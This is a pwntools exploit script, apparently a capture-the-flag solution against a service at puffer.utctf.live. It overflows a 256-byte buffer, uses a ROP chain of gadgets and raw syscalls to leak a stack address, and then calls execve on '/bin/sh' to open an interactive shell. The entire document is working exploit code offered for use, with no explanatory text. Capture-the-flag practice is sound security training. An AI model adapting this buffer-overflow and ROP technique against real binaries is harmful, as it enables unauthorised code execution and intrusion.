from pwn import *

# context.log_level = 'debug'
hello   = context.binary = ELF('./hello', checksec=False)
# loader  = context.binary = ELF('./loadere', checksec=False)

if args.HELLO:
    r = hello.process()
    gdb.attach(r, api=True, gdbscript='''
            b*0x4000186
            # b*0x4002bfe
            ''')
elif args.REMOTE:
    r = remote('puffer.utctf.live', 7132)
else:
    # r = loader.process(["hello"])
    context.terminal=["foot"]
    r = gdb.debug(['./loadere','hello'], api=True)
    # gdb.attach(r, api=True, gdbscript='''
    #         b*hook_syscall+515
    #         b*hook_syscall+642
    #         b*hook_syscall+1153
    #         b*hook_syscall+1432
    #         # b*hook_syscall+1414
    #         # b*hook_syscall+1088
    #         ''')

pop_rdi = 0x00000000040013af
ret     = 0x0000000000401002
pop_rax = 0x0000000000401001
pop_rdx = 0x00000000040023b3
pop_rsi = 0x00000000040013ad
syscall = 0x00000000040024ab
addr    = 0x4005c88 
binsh_off = -1008

payload = b'a'*256 + b'/bin/sh\x00'
payload += p64(pop_rdi) + p64(addr) + p64(hello.sym['puts'])*52
payload += flat(
    pop_rax, 0x400,
    pop_rdi, 7820912,
    syscall,
    pop_rax, 0x0,
    pop_rdi, 0x0,
    pop_rsi, addr, 0,
    pop_rdx, 0x60,
    syscall,
    pop_rax, 0x1,
    pop_rdi, 0x1,
    pop_rsi, addr, 0,
    pop_rdx, 0x60,
    syscall,
    hello.sym['main']
)
r.sendlineafter(b'name: \n', payload)
r.recv()
r.send(b'a'*12 + b'abcd')

r.recvuntil(b"buf='")
r.recvuntil(b'abcd')
stack = r.recv(6)
stack = u64(stack + b'\x00'*2)
binsh = stack + binsh_off
print(hex(stack))
print(hex(binsh))

payload = b'a'*256 + b'/bin/sh\x00'
payload += flat(
    pop_rdi, addr,
    hello.sym['gets'],
    pop_rax, 0x3b,
    pop_rdi, binsh,
    pop_rsi, 0,0,
    pop_rdx,0,
    syscall  
)

r.sendlineafter(b'name: \n', payload)
r.recv()
r.sendline(b'/bin/sh\x00')


r.interactive()
